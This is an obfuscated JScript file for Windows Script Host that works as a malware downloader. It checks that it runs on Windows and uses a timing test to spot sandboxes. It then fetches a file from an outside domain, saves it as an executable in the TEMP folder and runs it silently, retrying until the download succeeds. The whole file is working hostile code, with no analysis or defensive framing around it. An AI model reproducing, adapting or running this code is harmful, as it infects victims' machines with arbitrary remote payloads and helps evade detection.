var _HV = false;
var _JJ = "CreateObject";
var _XS = function _LU() {return WScript[_JJ]("WScript"+".Shell");}(), _HR = 11;
var _D = "MSXML2.XMLHTTP";
var _R = 2123213;
var _K = 0;
function _JR(_MY){_XS["Run"](_MY, _K, _K);};
function _WL(){return _D + "";};
function _T(_W0, _J){_K = _K * 1; return _W0 - _J;};
function _CJ(){return _JJ;};
/*@cc_on
  @if (@_win32 || @_win64)
    _HV = true;
  @end
@*/
if (_HV)
{
var _N = "";
function _EJ(){return 22;};
var _TG = 0; var _YK = 0;
function _X()
{
var _P = new this["Date"]();
var _H0 = _P["getUTCMilliseconds"]();
WScript["Sleep"](_EJ());
var _P = new this["Date"]();
var _S = _P["getUTCMilliseconds"]();
WScript["Sleep"](_EJ());
var _P = new this["Date"]();
var _E = _P["getUTCMilliseconds"]();
var _TG = "_H";
_TG = _T(_S, _H0);
var _YK = "_UP";
_YK = _T(_E, _S);
_N = "open";
return _T(_TG, _YK);
}
var _D0 = false;
var _LL = false;
for (var _VP = _K; _VP < _EJ() * 1; _VP++){if (_X() != _K){
_D0 = true; 
_YK = "31" + 11 * _TG + _YK; 
_LL = true; 
break;
}}
function _MQ() {return ((_D0 == true) && (_D0 == _LL)) ? 1 : _K;};
if (_D0 && _MQ() && _LL){
function _EN() {return _XS["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "o1Nr4SDtlZo.ex" + "e";};
 _Q0 = _WL();
 _Q = WScript[_JJ](_Q0);
 var _UF = 1;
 while (_UF){
try {
	if (_UF == 1)
	{
		_Q[_N]("GET", "http://smartbs-cameroun.com/nc7sjd", false);
		_Q["send"]();
		_XF = "Sleep";
	}
	WScript[_XF](_EJ() + 120); 
	if (_Q["readystate"] < 2 * 2) continue;
	_UF = _K;
	function _DP(_O) {var _SS = (1, 2, 3, 4, 5, _O); return _SS;};
	_W = WScript[_CJ()]("ADODB.Stream");
	_Q0 = _W;
	_Q0[_N]();
	_Q0["type"] = _DP(1);
	_Q0["write"](_Q["ResponseBody"]);
	_W["position"] = _DP(_K);
	_Q0["Save" + "ToFile"](_EN(), 2);
	_W["cl"+"ose"]();
	_V = _EN();
	_JR(_V);
} catch(_UL){};
}
}
}

